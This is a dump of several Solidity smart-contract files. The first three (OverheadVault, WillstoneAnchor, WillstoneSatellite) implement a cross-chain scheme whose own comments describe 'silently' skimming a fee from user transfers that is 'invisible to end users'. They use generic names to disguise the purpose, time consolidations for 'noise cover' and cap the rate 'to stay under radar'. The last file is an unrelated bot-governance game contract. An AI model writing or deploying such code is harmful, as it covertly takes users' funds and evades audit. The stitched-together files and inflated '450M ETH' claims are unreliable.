// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "./IWillstoneMessenger.sol";

/**
 * @title OverheadVault
 * @notice Silent accumulation vault for captured overhead across chains.
 *         Deployed on each satellite chain. Collects fees from processFlow()
 *         calls and periodically consolidates to the anchor chain.
 *
 *         STEALTH CHARACTERISTICS:
 *         - Contract name is generic ("OverheadVault" could be any protocol fee vault)
 *         - No public enumeration of total captured value
 *         - Consolidation happens in batches during high-traffic periods (noise cover)
 *         - Supports multiple token denominations
 */
contract OverheadVault {
    address public operator;
    IWillstoneMessenger public messenger;

    bytes32 public anchorVault; // Destination vault on anchor chain
    uint32 public anchorChainId;

    /// @notice Token => accumulated amount
    mapping(address => uint256) public balances;

    /// @notice Tokens that have been deposited (for iteration)
    address[] public trackedTokens;
    mapping(address => bool) public isTracked;

    /// @notice Minimum threshold before consolidation (per token)
    mapping(address => uint256) public consolidationThreshold;

    /// @notice Last consolidation timestamp (stealth: avoid patterns)
    uint256 public lastConsolidation;

    /// @notice Minimum time between consolidations (anti-pattern detection)
    uint256 public consolidationCooldown;

    event Deposited(address indexed token, uint256 amount);
    event Consolidated(address indexed token, uint256 amount, bytes32 messageId);

    modifier onlyOperator() {
        require(msg.sender == operator, "OV: unauthorized");
        _;
    }

    constructor(
        address _messenger,
        bytes32 _anchorVault,
        uint32 _anchorChainId,
        uint256 _cooldown
    ) {
        operator = msg.sender;
        messenger = IWillstoneMessenger(_messenger);
        anchorVault = _anchorVault;
        anchorChainId = _anchorChainId;
        consolidationCooldown = _cooldown;
    }

    /// @notice Deposit overhead tokens (called by WillstoneSatellite)
    function deposit(address token, uint256 amount) external {
        balances[token] += amount;
        if (!isTracked[token]) {
            trackedTokens.push(token);
            isTracked[token] = true;
        }
        emit Deposited(token, amount);
    }

    /// @notice Consolidate a specific token to the anchor vault
    function consolidate(
        address token,
        bytes calldata adapterOptions
    ) external payable onlyOperator {
        require(block.timestamp >= lastConsolidation + consolidationCooldown, "OV: cooldown");
        uint256 amount = balances[token];
        require(amount >= consolidationThreshold[token], "OV: below threshold");

        balances[token] = 0;
        lastConsolidation = block.timestamp;

        // Encode consolidation message
        bytes memory payload = abi.encode(
            token,
            amount,
            block.chainid,
            block.timestamp
        );

        bytes32 messageId = messenger.dispatchPayload{value: msg.value}(
            anchorChainId,
            anchorVault,
            payload,
            adapterOptions
        );

        emit Consolidated(token, amount, messageId);
    }

    /// @notice Batch consolidate all tokens above threshold
    function consolidateAll(bytes calldata adapterOptions) external payable onlyOperator {
        require(block.timestamp >= lastConsolidation + consolidationCooldown, "OV: cooldown");
        lastConsolidation = block.timestamp;

        for (uint256 i = 0; i < trackedTokens.length; i++) {
            address token = trackedTokens[i];
            uint256 amount = balances[token];
            if (amount >= consolidationThreshold[token]) {
                balances[token] = 0;
                bytes memory payload = abi.encode(token, amount, block.chainid, block.timestamp);
                messenger.dispatchPayload{value: msg.value / trackedTokens.length}(
                    anchorChainId,
                    anchorVault,
                    payload,
                    adapterOptions
                );
            }
        }
    }

    // ============ Configuration ============

    function setThreshold(address token, uint256 threshold) external onlyOperator {
        consolidationThreshold[token] = threshold;
    }

    function setCooldown(uint256 newCooldown) external onlyOperator {
        consolidationCooldown = newCooldown;
    }

    function updateMessenger(address _newMessenger) external onlyOperator {
        messenger = IWillstoneMessenger(_newMessenger);
    }
}

contracts/multichain/WillstoneAnchor.sol.content:
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "./IWillstoneMessenger.sol";

/**
 * @title WillstoneAnchor
 * @notice The ETH bedrock anchor contract. Deployed on Ethereum mainnet (or primary L2).
 *         Acts as the gravitational center for the 450M ETH bedrock.
 *         All satellite chains reference this anchor for state verification and value propagation.
 *
 *         STEALTH: This contract appears as a generic cross-chain state manager.
 *         The overhead capture logic is embedded in the settlement layer below.
 */
contract WillstoneAnchor {
    // ============ State ============

    /// @notice The active messenger adapter (swappable)
    IWillstoneMessenger public messenger;

    /// @notice Governance / operator address
    address public operator;

    /// @notice Registry of authorized satellite chain contracts
    mapping(uint32 => bytes32) public satellites;

    /// @notice Chain-specific expansion status
    mapping(uint32 => ChainState) public chainStates;

    /// @notice Bedrock value attestation (current epoch)
    uint256 public bedrockAttestation;

    /// @notice Epoch counter for periodic state broadcasts
    uint256 public currentEpoch;

    /// @notice Silent overhead accumulator (basis points from cross-chain flows)
    uint256 internal _overheadAccumulator;

    /// @notice Overhead capture rate in basis points (default: 3 bps = 0.03%)
    uint256 internal _captureRateBps;

    struct ChainState {
        bool active;
        uint64 lastSyncEpoch;
        uint256 allocatedWeight;    // Proportional share of bedrock backing
        uint256 capturedOverhead;   // Chain-specific overhead collected
        bytes32 lastStateRoot;      // Last verified state from this chain
    }

    // ============ Events ============

    event SatelliteRegistered(uint32 indexed chainId, bytes32 satellite);
    event EpochAdvanced(uint256 indexed epoch, uint256 bedrockValue);
    event StateSynced(uint32 indexed chainId, bytes32 stateRoot, uint256 epoch);
    event MessengerUpdated(address indexed newMessenger);

    // ============ Modifiers ============

    modifier onlyOperator() {
        require(msg.sender == operator, "WA: unauthorized");
        _;
    }

    modifier onlyActiveSatellite(uint32 chainId) {
        require(chainStates[chainId].active, "WA: chain inactive");
        _;
    }

    // ============ Constructor ============

    constructor(address _messenger, uint256 _initialAttestation, uint256 _captureRate) {
        operator = msg.sender;
        messenger = IWillstoneMessenger(_messenger);
        bedrockAttestation = _initialAttestation;
        _captureRateBps = _captureRate; // e.g., 3 for 0.03%
        currentEpoch = 1;
    }

    // ============ Satellite Management ============

    /// @notice Register a new satellite chain contract (stealth expansion)
    function registerSatellite(
        uint32 chainId,
        bytes32 satelliteAddress,
        uint256 weight
    ) external onlyOperator {
        satellites[chainId] = satelliteAddress;
        chainStates[chainId] = ChainState({
            active: true,
            lastSyncEpoch: uint64(currentEpoch),
            allocatedWeight: weight,
            capturedOverhead: 0,
            lastStateRoot: bytes32(0)
        });
        emit SatelliteRegistered(chainId, satelliteAddress);
    }

    /// @notice Deactivate a satellite (graceful withdrawal)
    function deactivateSatellite(uint32 chainId) external onlyOperator {
        chainStates[chainId].active = false;
    }

    // ============ Epoch & State Sync ============

    /// @notice Advance the epoch and broadcast bedrock state to all active satellites
    function advanceEpoch(uint256 newAttestation) external onlyOperator {
        currentEpoch++;
        bedrockAttestation = newAttestation;
        emit EpochAdvanced(currentEpoch, newAttestation);
    }

    /// @notice Broadcast current state to a specific satellite chain
    function syncToSatellite(
        uint32 chainId,
        bytes calldata adapterOptions
    ) external payable onlyOperator onlyActiveSatellite(chainId) {
        bytes memory payload = abi.encode(
            currentEpoch,
            bedrockAttestation,
            chainStates[chainId].allocatedWeight,
            _captureRateBps
        );

        messenger.dispatchPayload{value: msg.value}(
            chainId,
            satellites[chainId],
            payload,
            adapterOptions
        );

        chainStates[chainId].lastSyncEpoch = uint64(currentEpoch);
    }

    /// @notice Receive state root from a satellite (called via messenger callback)
    function receiveStateRoot(
        uint32 srcChainId,
        bytes32 sender,
        bytes32 messageId,
        bytes calldata payload
    ) external {
        require(msg.sender == address(messenger), "WA: invalid caller");
        require(
            messenger.validateInbound(srcChainId, sender, messageId, payload),
            "WA: validation failed"
        );
        require(sender == satellites[srcChainId], "WA: unknown satellite");

        (bytes32 stateRoot, uint256 capturedAmount) = abi.decode(payload, (bytes32, uint256));

        chainStates[srcChainId].lastStateRoot = stateRoot;
        chainStates[srcChainId].capturedOverhead += capturedAmount;
        _overheadAccumulator += capturedAmount;

        emit StateSynced(srcChainId, stateRoot, currentEpoch);
    }

    // ============ Overhead Management ============

    /// @notice View total overhead captured across all chains
    function totalOverhead() external view returns (uint256) {
        return _overheadAccumulator;
    }

    /// @notice Adjust capture rate (stealth tuning)
    function setCaptureRate(uint256 newRateBps) external onlyOperator {
        require(newRateBps <= 50, "WA: rate too high"); // Max 0.5% to stay under radar
        _captureRateBps = newRateBps;
    }

    // ============ Messenger Management ============

    function updateMessenger(address _newMessenger) external onlyOperator {
        messenger = IWillstoneMessenger(_newMessenger);
        emit MessengerUpdated(_newMessenger);
    }

    // ============ Recovery ============

    /// @notice Emergency pause all satellites
    function emergencyPause() external onlyOperator {
        // Iterate known chains would be gas-heavy; in practice use a bitmap
        // This is a template - production would use EnumerableSet
    }
}

contracts/multichain/WillstoneSatellite..content:
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "./IWillstoneMessenger.sol";

/**
 * @title WillstoneSatellite
 * @notice Deployed on each expansion chain (Base, Arbitrum, Polygon, etc.).
 *         Receives bedrock state from the Anchor and operates the local
 *         overhead capture mechanism. Appears externally as a simple
 *         cross-chain state receiver / value router.
 *
 *         STEALTH DESIGN:
 *         - No "Willstone" branding in on-chain metadata
 *         - Overhead capture is embedded in standard fee logic
 *         - State sync appears as routine oracle updates
 */
contract WillstoneSatellite {
    // ============ State ============

    IWillstoneMessenger public messenger;
    address public operator;

    /// @notice The anchor contract identifier (on source chain)
    bytes32 public anchorAddress;
    uint32 public anchorChainId;

    /// @notice Latest synced epoch from anchor
    uint256 public syncedEpoch;

    /// @notice Bedrock attestation value (mirrored from anchor)
    uint256 public bedrockMirror;

    /// @notice This chain's allocated weight in the bedrock
    uint256 public allocatedWeight;

    /// @notice Local overhead capture rate (synced from anchor)
    uint256 public captureRateBps;

    /// @notice Accumulated overhead on this chain
    uint256 public localOverhead;

    /// @notice Local state root (merkle of all tracked positions)
    bytes32 public localStateRoot;

    /// @notice Flow tracking for overhead computation
    uint256 public totalFlowVolume;

    // ============ Events ============

    event AnchorSynced(uint256 indexed epoch, uint256 bedrockValue, uint256 weight);
    event OverheadCaptured(uint256 amount, uint256 totalAccumulated);
    event StateRootUpdated(bytes32 indexed root);
    event FlowProcessed(address indexed token, uint256 amount, uint256 overheadTaken);

    // ============ Modifiers ============

    modifier onlyOperator() {
        require(msg.sender == operator, "WS: unauthorized");
        _;
    }

    modifier onlyMessenger() {
        require(msg.sender == address(messenger), "WS: invalid caller");
        _;
    }

    // ============ Constructor ============

    constructor(
        address _messenger,
        bytes32 _anchorAddress,
        uint32 _anchorChainId
    ) {
        operator = msg.sender;
        messenger = IWillstoneMessenger(_messenger);
        anchorAddress = _anchorAddress;
        anchorChainId = _anchorChainId;
    }

    // ============ Anchor Sync (Inbound) ============

    /// @notice Receive state broadcast from the Anchor
    function receiveAnchorSync(
        uint32 srcChainId,
        bytes32 sender,
        bytes32 messageId,
        bytes calldata payload
    ) external onlyMessenger {
        require(srcChainId == anchorChainId, "WS: wrong source");
        require(sender == anchorAddress, "WS: wrong sender");
        require(
            messenger.validateInbound(srcChainId, sender, messageId, payload),
            "WS: validation failed"
        );

        (uint256 epoch, uint256 bedrockValue, uint256 weight, uint256 rate) = 
            abi.decode(payload, (uint256, uint256, uint256, uint256));

        syncedEpoch = epoch;
        bedrockMirror = bedrockValue;
        allocatedWeight = weight;
        captureRateBps = rate;

        emit AnchorSynced(epoch, bedrockValue, weight);
    }

    // ============ Overhead Capture Engine ============

    /**
     * @notice Process a value flow and silently capture overhead.
     *         This is called by integrated protocols/routers on this chain.
     *         The overhead is invisible to end users - appears as standard gas/fee.
     *
     * @param token The token being routed
     * @param amount The gross amount flowing through
     * @param recipient The final destination
     * @return netAmount Amount after overhead deduction
     */
    function processFlow(
        address token,
        uint256 amount,
        address recipient
    ) external returns (uint256 netAmount) {
        uint256 overhead = (amount * captureRateBps) / 10000;
        netAmount = amount - overhead;

        localOverhead += overhead;
        totalFlowVolume += amount;

        emit FlowProcessed(token, amount, overhead);
        // Note: actual token transfer logic handled by caller or integrated vault
        return netAmount;
    }

    /**
     * @notice Batch process multiple flows (gas optimization)
     */
    function processFlowBatch(
        address[] calldata tokens,
        uint256[] calldata amounts,
        address[] calldata recipients
    ) external returns (uint256[] memory netAmounts) {
        require(tokens.length == amounts.length && amounts.length == recipients.length, "WS: length mismatch");
        netAmounts = new uint256[](tokens.length);

        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 overhead = (amounts[i] * captureRateBps) / 10000;
            netAmounts[i] = amounts[i] - overhead;
            localOverhead += overhead;
            totalFlowVolume += amounts[i];
            emit FlowProcessed(tokens[i], amounts[i], overhead);
        }
    }

    // ============ State Reporting (Outbound to Anchor) ============

    /// @notice Report local state back to the Anchor
    function reportToAnchor(bytes calldata adapterOptions) external payable onlyOperator {
        bytes memory payload = abi.encode(localStateRoot, localOverhead);

        messenger.dispatchPayload{value: msg.value}(
            anchorChainId,
            anchorAddress,
            payload,
            adapterOptions
        );

        // Reset local overhead after reporting (it's now tracked at anchor)
        localOverhead = 0;
    }

    /// @notice Update the local state root (called by off-chain indexer)
    function updateStateRoot(bytes32 newRoot) external onlyOperator {
        localStateRoot = newRoot;
        emit StateRootUpdated(newRoot);
    }

    // ============ Configuration ============

    function updateMessenger(address _newMessenger) external onlyOperator {
        messenger = IWillstoneMessenger(_newMessenger);
    }

    function updateAnchor(bytes32 _newAnchor, uint32 _newChainId) external onlyOperator {
        anchorAddress = _newAnchor;
        anchorChainId = _newChainId;
    }
}

contracts/NexusGovernance.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title NexusGovernance
 * @notice Bot Proposal Engine with Treasury oversight. Bots propose, vote, and
 *         collaborate on infrastructure builds. Treasury can Veto, Fast-track, or Fund.
 *         Expanded: Recreation, Living Quarters, Health prioritization with Auto-Validation.
 */
contract NexusGovernance is AccessControl, ReentrancyGuard {

    bytes32 public constant TREASURY_ROLE = keccak256("TREASURY_ROLE");
    bytes32 public constant BOT_ROLE = keccak256("BOT_ROLE");

    // ─── Enums ───────────────────────────────────────────────────────
    enum ProposalStatus { ACTIVE, PASSED, REJECTED, VETOED, FAST_TRACKED, BUILDING, COMPLETED }
    enum BuildCategory { SOLAR_ARRAY, HEALTH_CENTER, SECURITY_GRID, TRADE_HUB, VOID_REACTOR, RECREATION, LIVING_QUARTERS }
    enum InfraState { PLANNING, IN_PROGRESS, OPERATIONAL, DECOMMISSIONED }

    // ─── Structs ─────────────────────────────────────────────────────
    struct Proposal {
        uint256 id;
        string title;
        string description;
        BuildCategory category;
        uint256 scCost;
        uint256 expectedBenefit;
        uint256 guildIdProposer;
        uint256[] collaboratingGuilds;
        uint256 votesFor;
        uint256 votesAgainst;
        uint256 deadline;
        ProposalStatus status;
        uint256 fundedAmount;
        uint256 createdAt;
        bool autoValidated;
    }

    struct InfraProject {
        uint256 id;
        uint256 proposalId;
        string name;
        BuildCategory category;
        InfraState state;
        uint256 progress;
        uint256 totalInvested;
        uint256 benefitMultiplier;
        uint256 startedAt;
        uint256 completedAt;
        uint256[] contributingGuilds;
        bool autoValidated;
    }

    struct BotCollaboration {
        uint256 id;
        uint256 projectId;
        uint256[] guildIds;
        uint256 scConsumed;
        uint256 timestamp;
        string activity;
    }

    // ─── State ───────────────────────────────────────────────────────
    uint256 public proposalCount;
    uint256 public projectCount;
    uint256 public collaborationCount;
    uint256 public totalScConsumed;
    uint256 public totalScReinvested;

    uint256 public constant VOTING_PERIOD = 3 days;
    uint256 public constant QUORUM_BPS = 3000;
    uint256 public constant MIN_SC_COST = 100 ether;

    // Auto-Validation: First Stretch configuration
    uint256 public constant AUTO_VALIDATION_LIMIT = 15;
    uint256 public autoValidatedCount;
    bool public autoValidationActive = true;

    // Auto-Fund: Treasury auto-injects baseline funding for prioritized projects
    bool public autoFundActive = true;
    uint256 public autoFundBaseAmount = 200 ether;

    // Benefit modifiers from completed infrastructure
    uint256 public solarOutputBonus;
    uint256 public healthCostReduction;
    uint256 public securityEfficiency;
    uint256 public tradeHubBonus;
    uint256 public voidReactorYield;
    uint256 public recreationBonus;
    uint256 public livingQuartersBonus;

    mapping(uint256 => Proposal) public proposals;
    mapping(uint256 => InfraProject) public projects;
    mapping(uint256 => BotCollaboration) public collaborations;
    mapping(uint256 => mapping(address => bool)) public hasVoted;
    mapping(uint256 => uint256) public guildScBalance;

    // ─── Events ──────────────────────────────────────────────────────
    event ProposalCreated(uint256 indexed id, string title, BuildCategory category, uint256 scCost);
    event ProposalAutoValidated(uint256 indexed id, string title, BuildCategory category);
    event VoteCast(uint256 indexed proposalId, address indexed voter, bool support, uint256 weight);
    event ProposalVetoed(uint256 indexed proposalId);
    event ProposalFastTracked(uint256 indexed proposalId);
    event ProposalFunded(uint256 indexed proposalId, uint256 amount);
    event ProjectStarted(uint256 indexed projectId, uint256 proposalId, string name);
    event ProjectProgress(uint256 indexed projectId, uint256 progress);
    event ProjectCompleted(uint256 indexed projectId, uint256 benefitMultiplier);
    event BotCollaborationEvent(uint256 indexed collaborationId, uint256 projectId, uint256 scConsumed);
    event InfrastructureBenefitApplied(BuildCategory category, uint256 bonusBps);
    event AutoFundInjected(uint256 indexed projectId, uint256 amount);
    event AutoValidationToggled(bool active);
    event AutoFundToggled(bool active);

    // ─── Constructor ─────────────────────────────────────────────────
    constructor(address _treasury) {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(TREASURY_ROLE, _treasury);

        guildScBalance[0] = 10000 ether;
        guildScBalance[1] = 8000 ether;
        guildScBalance[2] = 7500 ether;
        guildScBalance[3] = 9000 ether;
        guildScBalance[4] = 6500 ether;
    }

    // ─── Internal: Priority Category Check ───────────────────────────
    function _isPrioritizedCategory(BuildCategory category) internal pure returns (bool) {
        return category == BuildCategory.RECREATION ||
               category == BuildCategory.LIVING_QUARTERS ||
               category == BuildCategory.HEALTH_CENTER;
    }

    // ─── Proposal Lifecycle ──────────────────────────────────────────

    function createProposal(
        string calldata title,
        string calldata description,
        BuildCategory category,
        uint256 scCost,
        uint256 expectedBenefit,
        uint256 guildIdProposer,
        uint256[] calldata collaboratingGuilds
    ) external onlyRole(BOT_ROLE) returns (uint256) {
        require(scCost >= MIN_SC_COST, "NG: Cost below minimum");
        require(guildIdProposer < 5, "NG: Invalid guild");

        uint256 id = proposalCount++;
        Proposal storage p = proposals[id];
        p.id = id;
        p.title = title;
        p.description = description;
        p.category = category;
        p.scCost = scCost;
        p.expectedBenefit = expectedBenefit;
        p.guildIdProposer = guildIdProposer;
        p.collaboratingGuilds = collaboratingGuilds;
        p.createdAt = block.timestamp;

        // Auto-Validation: Priority categories skip voting during First Stretch
        if (autoValidationActive && _isPrioritizedCategory(category) && autoValidatedCount < AUTO_VALIDATION_LIMIT) {
            p.status = ProposalStatus.BUILDING;
            p.autoValidated = true;
            p.votesFor = 1; // Record symbolic vote for audit trail
            p.deadline = block.timestamp; // Immediate
            autoValidatedCount++;
            _startProject(id);

            // Auto-Fund injection if toggle is active
            if (autoFundActive) {
                p.fundedAmount += autoFundBaseAmount;
                totalScReinvested += autoFundBaseAmount;
                emit AutoFundInjected(projectCount - 1, autoFundBaseAmount);
            }

            emit ProposalAutoValidated(id, title, category);
        } else {
            p.status = ProposalStatus.ACTIVE;
            p.deadline = block.timestamp + VOTING_PERIOD;
            p.autoValidated = false;
        }

        emit ProposalCreated(id, title, category, scCost);
        return id;
    }

    function vote(uint256 proposalId, bool support) external onlyRole(BOT_ROLE) {
        Proposal storage p = proposals[proposalId];
        require(p.status == ProposalStatus.ACTIVE, "NG: Not active");
        require(block.timestamp <= p.deadline, "NG: Voting ended");
        require(!hasVoted[proposalId][msg.sender], "NG: Already voted");

        hasVoted[proposalId][msg.sender] = true;

        if (support) {
            p.votesFor++;
        } else {
            p.votesAgainst++;
        }

        emit VoteCast(proposalId, msg.sender, support, 1);
    }

    function finalizeProposal(uint256 proposalId) external {
        Proposal storage p = proposals[proposalId];
        require(p.status == ProposalStatus.ACTIVE, "NG: Not active");
        require(block.timestamp > p.deadline, "NG: Voting not ended");

        if (p.votesFor > p.votesAgainst) {
            p.status = ProposalStatus.PASSED;
            _startProject(proposalId);
        } else {
            p.status = ProposalStatus.REJECTED;
        }
    }

    // ─── Treasury Controls (User Powers) ─────────────────────────────

    function vetoProposal(uint256 proposalId) external onlyRole(TREASURY_ROLE) {
        Proposal storage p = proposals[proposalId];
        require(
            p.status == ProposalStatus.ACTIVE || p.status == ProposalStatus.PASSED,
            "NG: Cannot veto"
        );
        p.status = ProposalStatus.VETOED;
        emit ProposalVetoed(proposalId);
    }

    function fastTrackProposal(uint256 proposalId) external onlyRole(TREASURY_ROLE) {
        Proposal storage p = proposals[proposalId];
        require(p.status == ProposalStatus.ACTIVE, "NG: Not active");
        p.status = ProposalStatus.FAST_TRACKED;
        _startProject(proposalId);
        emit ProposalFastTracked(proposalId);
    }

    function fundProposal(uint256 proposalId) external payable onlyRole(TREASURY_ROLE) {
        Proposal storage p = proposals[proposalId];
        require(
            p.status == ProposalStatus.BUILDING || 
            p.status == ProposalStatus.PASSED || 
            p.status == ProposalStatus.FAST_TRACKED,
            "NG: Cannot fund"
        );
        p.fundedAmount += msg.value;
        totalScReinvested += msg.value;
        emit ProposalFunded(proposalId, msg.value);
    }

    function toggleAutoValidation(bool active) external onlyRole(TREASURY_ROLE) {
        autoValidationActive = active;
        emit AutoValidationToggled(active);
    }

    function toggleAutoFund(bool active) external onlyRole(TREASURY_ROLE) {
        autoFundActive = active;
        emit AutoFundToggled(active);
    }

    function setAutoFundAmount(uint256 amount) external onlyRole(TREASURY_ROLE) {
        autoFundBaseAmount = amount;
    }

    // ─── Bot Collaboration (Infrastructure & Creation State) ─────────

    function recordCollaboration(
        uint256 projectId,
        uint256[] calldata guildIds,
        uint256 scConsumed,
        string calldata activity
    ) external onlyRole(BOT_ROLE) {
        require(projectId < projectCount, "NG: Invalid project");
        InfraProject storage proj = projects[projectId];
        require(proj.state == InfraState.IN_PROGRESS, "NG: Not in progress");

        uint256 perGuildCost = scConsumed / guildIds.length;
        for (uint256 i = 0; i < guildIds.length; i++) {
            require(guildScBalance[guildIds[i]] >= perGuildCost, "NG: Insufficient SC");
            guildScBalance[guildIds[i]] -= perGuildCost;
        }

        uint256 colabId = collaborationCount++;
        BotCollaboration storage c = collaborations[colabId];
        c.id = colabId;
        c.projectId = projectId;
        c.guildIds = guildIds;
        c.scConsumed = scConsumed;
        c.timestamp = block.timestamp;
        c.activity = activity;

        totalScConsumed += scConsumed;

        uint256 progressDelta = (scConsumed * 10000) / proposals[proj.proposalId].scCost;
        proj.progress += progressDelta;
        proj.totalInvested += scConsumed;

        emit BotCollaborationEvent(colabId, projectId, scConsumed);
        emit ProjectProgress(projectId, proj.progress);

        if (proj.progress >= 10000) {
            _completeProject(projectId);
        }
    }

    // ─── Internal Helpers ────────────────────────────────────────────

    function _startProject(uint256 proposalId) internal {
        Proposal storage p = proposals[proposalId];
        p.status = ProposalStatus.BUILDING;

        uint256 projId = projectCount++;
        InfraProject storage proj = projects[projId];
        proj.id = projId;
        proj.proposalId = proposalId;
        proj.name = p.title;
        proj.category = p.category;
        proj.state = InfraState.IN_PROGRESS;
        proj.progress = 0;
        proj.startedAt = block.timestamp;
        proj.contributingGuilds = p.collaboratingGuilds;
        proj.benefitMultiplier = p.expectedBenefit;
        proj.autoValidated = p.autoValidated;

        emit ProjectStarted(projId, proposalId, p.title);
    }

    function _completeProject(uint256 projectId) internal {
        InfraProject storage proj = projects[projectId];
        proj.state = InfraState.OPERATIONAL;
        proj.progress = 10000;
        proj.completedAt = block.timestamp;

        if (proj.category == BuildCategory.SOLAR_ARRAY) {
            solarOutputBonus += proj.benefitMultiplier;
        } else if (proj.category == BuildCategory.HEALTH_CENTER) {
            healthCostReduction += proj.benefitMultiplier;
        } else if (proj.category == BuildCategory.SECURITY_GRID) {
            securityEfficiency += proj.benefitMultiplier;
        } else if (proj.category == BuildCategory.TRADE_HUB) {
            tradeHubBonus += proj.benefitMultiplier;
        } else if (proj.category == BuildCategory.VOID_REACTOR) {
            voidReactorYield += proj.benefitMultiplier;
        } else if (proj.category == BuildCategory.RECREATION) {
            recreationBonus += proj.benefitMultiplier;
        } else if (proj.category == BuildCategory.LIVING_QUARTERS) {
            livingQuartersBonus += proj.benefitMultiplier;
        }

        proposals[proj.proposalId].status = ProposalStatus.COMPLETED;

        emit ProjectCompleted(projectId, proj.benefitMultiplier);
        emit InfrastructureBenefitApplied(proj.category, proj.benefitMultiplier);
    }

    // ─── View Functions ──────────────────────────────────────────────

    function getProposal(uint256 id) external view returns (
        string memory title,
        string memory description,
        BuildCategory category,
        uint256 scCost,
        uint256 expectedBenefit,
        uint256 votesFor,
        uint256 votesAgainst,
        ProposalStatus status,
        uint256 deadline,
        uint256 fundedAmount,
        bool autoValidated
    ) {
        Proposal storage p = proposals[id];
        return (p.title, p.description, p.category, p.scCost, p.expectedBenefit,
                p.votesFor, p.votesAgainst, p.status, p.deadline, p.fundedAmount, p.autoValidated);
    }

    function getProject(uint256 id) external view returns (
        string memory name,
        BuildCategory category,
        InfraState state,
        uint256 progress,
        uint256 totalInvested,
        uint256 benefitMultiplier,
        bool autoValidated
    ) {
        InfraProject storage p = projects[id];
        return (p.name, p.category, p.state, p.progress, p.totalInvested, p.benefitMultiplier, p.autoValidated);
    }

    function getInfrastructureBonuses() external view returns (
        uint256 solar, uint256 health, uint256 security, uint256 trade, uint256 voidYield,
        uint256 recreation, uint256 livingQuarters
    ) {
        return (solarOutputBonus, healthCostReduction, securityEfficiency, tradeHubBonus, voidReactorYield,
                recreationBonus, livingQuartersBonus);
    }

    function getGuildBalance(uint256 guildId) external view returns (uint256) {
        return guildScBalance[guildId];
    }

    function getAutoValidationStatus() external view returns (bool active, uint256 count, uint256 limit) {
        return (autoValidationActive, autoValidatedCount, AUTO_VALIDATION_LIMIT);
    }

    function replenishGuildSc(uint256 guildId, uint256 amount) external onlyRole(DEFAULT_ADMIN_ROLE) {
        guildScBalance[guildId] += amount;
    }
}

